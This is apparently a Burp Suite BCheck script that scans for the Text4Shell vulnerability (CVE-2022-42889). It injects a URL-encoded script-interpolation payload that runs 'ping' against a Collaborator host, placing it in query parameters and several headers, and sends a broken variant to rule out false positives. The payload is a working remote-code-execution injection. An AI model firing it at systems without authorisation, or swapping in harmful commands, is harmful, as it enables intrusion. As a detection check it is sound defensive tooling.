metadata:
    language: v2-beta
    name: "Text4Shell"
    description: "Text4Shell Detected - CVE-2022-42889"
    author: "Giriraj R (cipherlover)"

define:
    text4shell = `$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ping%20-c%205%20{generate_collaborator_address()}%27)%7D`
    nottext4shell = `$%7Bscript:javascript:java.lang.Runtime.getRuntime().eec(%27ping%20-c%205%20{generate_collaborator_address()}%27)%7D`
    answer = "script:javascript:"
    issueDetail = `The collaborator payload {text4shell} was added to a query parameter and several headers. This resulted in an interaction with the Burp collaborator.`
    issueRemediation = "Make sure you are up to date with patches and follow the remediation for CVE-2022-42889."

given insertion point then
    
    if not({answer} in {base.response}) then
        send payload:
            appending: {text4shell}
	    send request:
	        method: "GET"
	        appending queries: `x={text4shell}`
	        replacing headers:
	            "Cookie": `{text4shell}={text4shell}`,
	            "User-Agent": {text4shell},
	            "Location": {text4shell},
	            "Origin": {text4shell},
	            "Referer": {text4shell}  

        if dns interactions then
	        send payload:
	            appending: {nottext4shell}
	        # perform a follow up to reduce false positives
	        send request:
	            method: "GET"
	            appending queries: `x={nottext4shell}`
	            replacing headers:
	                "Cookie": `{nottext4shell}={nottext4shell}`,
	                "User-Agent": {nottext4shell},
	                "Location": {nottext4shell},
	                "Origin": {nottext4shell},
	                "Referer": {nottext4shell}

	        if not(dns interactions) then
	            report issue:
	                severity: high
	                confidence: firm
	                detail: {issueDetail}
	                remediation: {issueRemediation}
	        end if
	    end if
    end if
